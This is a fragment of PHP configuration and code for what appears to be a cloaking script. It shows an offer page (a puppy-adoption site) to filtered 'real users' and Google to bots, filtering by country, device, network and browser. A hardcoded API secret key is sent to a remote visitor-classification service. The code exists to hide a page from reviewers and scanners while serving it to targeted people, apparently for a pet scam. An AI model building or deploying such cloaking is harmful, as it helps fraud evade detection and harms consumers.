...
/* Required settings     */
$HCSET['OFFER_PAGE'] = 'https://www.adoptapuppies.com/';//PHP/HTML file or URL offer used for real users
$HCSET['WHITE_PAGE'] = 'https://www.google.com';//PHP/HTML file or URL used for bots
...
$HCSET['FILTER_GEO_LIST'] = 'US, CA'; // string([2Chars country codes])

/* DEVICE FILTERS */
$HCSET['FILTER_DEV_MODE'] = 'allow'; // 'allow|reject'
$HCSET['FILTER_DEV_LIST'] = 'd_macOS,d_Windows'; // string([d_Windows|m_Android|m_iOS|d_macOS|m_other|d_other]);
...
$HCSET['FILTER_NET_LIST'] = 'vpn,mobile,corporate'; // string([vpn|mobile|residential|corporate]);

/* BROWSER FILTERS */
$HCSET['FILTER_BRO_MODE'] = 'allow'; // 'allow|reject'
$HCSET['FILTER_BRO_LIST'] = 'Chrome,Safari,FF,Other'; // string([Chrome|Safari|FF|Other]);
...
$HCSET['API_SECRET_KEY'] = 'v17eb8bc0f61524231b23677a40b9620e1';
/*********************************************/
...
function apiRequest($ip, $port, $HCSET, $HCSETdata)
{
    ...
    $url = 'http://'.$host.'/basic?ip=' . $ip . '&port=' . $port . '&key=' . $HCSET['API_SECRET_KEY'] . '&sign=v2-2141728960&js=false&stage='.$HCSET['stage'];
